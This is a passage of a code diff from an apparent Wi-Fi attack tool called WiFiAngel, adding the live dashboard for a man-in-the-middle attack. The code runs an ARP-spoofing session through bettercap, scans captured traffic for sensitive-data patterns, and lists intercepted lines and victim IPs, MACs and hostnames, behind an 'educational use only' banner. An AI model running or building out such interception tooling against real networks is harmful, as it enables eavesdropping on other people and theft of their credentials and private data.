+                                            # Get last lines
+                                            new_lines = lines[-50:]
+                                            for line in new_lines:
+                                                # Check for general traffic lines
+                                                if any(pattern in line.lower() for pattern in ["http", "tcp", "udp", "dns"]):
+                                                    if line not in attack_stats['last_traffic']:
+                                                        attack_stats['last_traffic'].append(line)
+                                                        update_traffic_log(line.strip())
+                                                
+                                                # Check specifically for sensitive data
+                                                if any(pattern in line.lower() for pattern in patterns):
+                                                    if line not in attack_stats['sensitive_matches']:
+                                                        attack_stats['sensitive_matches'].append(line)
+                                                        update_sensitive_log(line.strip())
+                                            
+                                            # Keep only last entries
+                                            attack_stats['last_traffic'] = attack_stats['last_traffic'][-15:]
+                                            attack_stats['sensitive_matches'] = attack_stats['sensitive_matches'][-15:]
+                                except:
+                                    pass
+                            except Exception as e:
+                                # Silently handle errors
+                                pass
+                            
+                            # 1. Update Header
+                            header = Panel(
+                                f"[bold red]Man in the Middle Attack Running[/] - [bold cyan]Elapsed: {elapsed_str}[/] - [bold yellow]Target: {target_desc}[/]",
+                                title="[bold white]WiFiAngel MITM Monitor[/]", 
+                                subtitle="[bold red]Press Ctrl+C to Stop[/]",
+                                border_style="red"
+                            )
+                            layout["header"].update(header)
+                            
+                            # 2. Update Status Panel
+                            status_data = Table(show_header=False, box=box.SIMPLE)
+                            status_data.add_column("Property", style="cyan", justify="right", width=12)
+                            status_data.add_column("Value", style="green")
+                            
+                            status_data.add_row("Interface", f"[bold]{selected_iface}[/]")
+                            status_data.add_row("Local IP", f"[bold]{selected_ip}[/]")
+                            status_data.add_row("Gateway", f"[bold]{selected_gateway}[/]")
+                            status_data.add_row("Status", "[bold green]Active[/]")
+                            status_data.add_row("Mode", "[bold yellow]ARP Spoofing[/]")
+                            status_data.add_row("Target", f"[bold red]{target_desc}[/]")
+                            
+                            status_panel = Panel(
+                                status_data,
+                                title="[bold blue]Attack Status[/]",
+                                border_style="blue"
+                            )
+                            layout["status"].update(status_panel)
+                            
+                            # 3. Update Network Traffic Panel
+                            traffic_table = Table(box=box.SIMPLE, show_header=True)
+                            traffic_table.add_column("#", style="dim", width=3)
+                            traffic_table.add_column("Traffic", style="green")
+                            
+                            if attack_stats['last_traffic']:
+                                for i, line in enumerate(attack_stats['last_traffic']):
+                                    traffic_table.add_row(f"{i+1}", f"{line.strip()}")
+                            else:
+                                traffic_table.add_row("", "[yellow]Waiting for traffic...[/]")
+                                
+                            traffic_panel = Panel(
+                                traffic_table,
+                                title=f"[bold green]Live Network Traffic[/]",
+                                border_style="green"
+                            )
+                            layout["network_traffic"].update(traffic_panel)
+                            
+                            # 4. Update Sensitive Data Panel
+                            sensitive_table = Table(box=box.SIMPLE, show_header=True)
+                            sensitive_table.add_column("#", style="dim", width=3)
+                            sensitive_table.add_column("Sensitive Data Match", style="red")
+                            
+                            if attack_stats['sensitive_matches']:
+                                for i, line in enumerate(attack_stats['sensitive_matches']):
+                                    sensitive_table.add_row(f"{i+1}", f"[bold red]{line.strip()}[/]")
+                            else:
+                                sensitive_table.add_row("", "[yellow]No sensitive data detected yet...[/]")
+                                
+                            sensitive_panel = Panel(
+                                sensitive_table,
+                                title=f"[bold red]Sensitive Data Matches[/]",
+                                border_style="red"
+                            )
+                            layout["sensitive_data"].update(sensitive_panel)
+                            
+                            # 5. Update Stats Panel
+                            stats_table = Table(show_header=True, box=box.SIMPLE)
+                            stats_table.add_column("Metric", style="cyan")
+                            stats_table.add_column("Value", style="green", justify="right")
+                            
+                            stats_table.add_row("Running Time", elapsed_str)
+                            stats_table.add_row("Packets", f"{attack_stats['packets']:,}")
+                            stats_table.add_row("Data", self._format_bytes(attack_stats['bytes']))
+                            stats_table.add_row("Active Clients", f"{len(attack_stats['clients']):,}")
+                            
+                            stats_panel = Panel(
+                                stats_table,
+                                title="[bold magenta]Attack Statistics[/]",
+                                border_style="magenta"
+                            )
+                            layout["stats"].update(stats_panel)
+                            
+                            # 6. Update Clients Panel - Daha fazla alan kullanacak şekilde güncellendi
+                            clients_table = Table(show_header=True, box=box.SIMPLE)
+                            clients_table.add_column("IP", style="cyan")
+                            clients_table.add_column("MAC", style="green", no_wrap=True)
+                            clients_table.add_column("Hostname", style="blue")
+                            
+                            if attack_stats['clients']:
+                                # Show most recent clients first
+                                sorted_clients = sorted(
+                                    attack_stats['clients'].items(), 
+                                    key=lambda x: x[1]['first_seen'], 
+                                    reverse=True
+                                )
+                                
+                                for ip, data in sorted_clients[:15]:  # Show up to 15 clients (öncekinden daha fazla)
+                                    clients_table.add_row(
+                                        ip, 
+                                        data['mac'], 
+                                        data['hostname'] if 'hostname' in data else "Unknown"
+                                    )
+                            else:
+                                clients_table.add_row("", "[yellow]No clients detected yet[/]", "")
+                                
+                            clients_panel = Panel(
+                                clients_table,
+                                title=f"[bold cyan]Detected Clients[/]",
+                                border_style="cyan"
+                            )
+                            layout["clients"].update(clients_panel)
+                            
+                            # 7. Update Footer
+                            footer = Panel(
+                                "[bold white on red]⚠️ EDUCATIONAL USE ONLY - Press Ctrl+C to stop attack - Unauthorized use is ILLEGAL ⚠️[/]",
+                                border_style="red"
+                            )
+                            layout["footer"].update(footer)
+                            
+                            # Small delay to prevent high CPU usage
+                            time.sleep(0.5)
+                            
+                    except KeyboardInterrupt:
+                        # User stopped the attack
+                        self.console.print("\n[bold yellow]MITM attack stopped by user.[/]")
+                    finally:
+                        # Close log files
+                        if 'bettercap_stdout_file' in locals() and not bettercap_stdout_file.closed:
+                            bettercap_stdout_file.close()
+                        if 'bettercap_stderr_file' in locals() and not bettercap_stderr_file.closed:
+                            bettercap_stderr_file.close()
+                        
+                        # Restore system settings
+                        self._restore_settings(original_ip_forward, original_iptables, bettercap_process)
+                        
+                        # Show summary
+                        self.console.print(f"\n[bold green]Attack completed. All logs saved to {log_dir}[/]")
+                        
+                        # Display sensitive data summary
+                        if attack_stats['sensitive_matches']:
+                            self.console.print("\n[bold red]Sensitive Data Summary:[/]")
+                            for data in attack_stats['sensitive_matches'][-5:]:  # Show last 5 entries
+                                self.console.print(f"[red]{data}[/]")
+                        
+                        # Display traffic summary
+                        self.console.print(f"\n[bold green]Traffic Summary:[/]")
+                        self.console.print(f"Total Packets: {attack_stats['packets']:,}")
+                        self.console.print(f"Total Data: {self._format_bytes(attack_stats['bytes'])}")
+                        self.console.print(f"Unique Clients: {len(attack_stats['clients']):,}")
+                        
+            except Exception as e:
+                # Handle unexpected errors
+                self.console.print(f"\n[bold red]Error during MITM attack: {str(e)}[/]")
+                import traceback
+                traceback.print_exc()
+                
+                # Always try to restore settings
+                if 'original_ip_forward' in locals() and 'original_iptables' in locals():
+                    self._restore_settings(original_ip_forward, original_iptables, 
+                                         bettercap_process if 'bettercap_process' in locals() else None)
 
 if __name__ == '__main__':
     main() 
